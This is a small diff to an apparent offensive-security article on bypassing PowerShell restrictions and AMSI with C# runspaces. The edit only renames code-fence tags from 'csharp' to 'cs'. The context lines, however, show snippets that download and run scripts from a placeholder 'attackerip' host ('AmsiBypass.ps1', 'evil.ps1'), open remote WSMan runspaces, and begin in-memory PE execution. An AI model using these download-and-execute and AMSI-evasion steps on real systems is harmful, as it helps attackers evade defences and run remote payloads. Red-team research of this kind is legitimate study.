@@ -156,7 +156,7 @@ The proposed bypass technique is very simple, and consists in abusing the class 
 
 The following snippet shows how to do it:
 
-```csharp
+```cs
 Runspace rs = RunspaceFactory.CreateRunspace();
 PowerShell ps = PowerShell.Create();
 
@@ -173,7 +173,7 @@ As this is not a new technique, there are already tools that implements the same
 
 It is also possible to create remote PowerShell runspaces, providing a WS-Management connection to the remote target:
 
-```csharp
+```cs
 var uri = new Uri("http://pc-2.test.local:5985/WSMAN");
 conn = new WSManConnectionInfo(uri);
 
@@ -323,7 +323,7 @@ With that in mind, implementing an AMSI Bypass is not so difficult, and there ar
 
 Point 2., instead, gives the attacker the possibility to load and execute any AMSI Bypass written in PowerShell. As an example, consider the following snippet:
 
-```csharp
+```cs
 PowerShell ps = PowerShell.Create();
 string code = "IEX (New-Object Net.WebClient).DownloadString('http://attackerip/AmsiBypass.ps1');";
 ps.AddScript(code).Invoke();
@@ -378,7 +378,7 @@ The general technique used to import arbitrary modules and PowerShell scripts, u
 
 As an example, please consider the following snippet:
 
-```csharp
+```cs
 PowerShell ps = PowerShell.Create();
 // Downloading module/script
 string script = (new WebClient()).DownloadString("http://attackerip/evil.ps1");
@@ -430,7 +430,7 @@ As the main objective of the project is to avoid any outgoing connections from t
 
 An example of the code handling this functionality is as easy as the following:
 
-```csharp
+```cs
 // Store and Execute code
 string execute_stub = $"$PEBytes = [byte[]] (";
 try
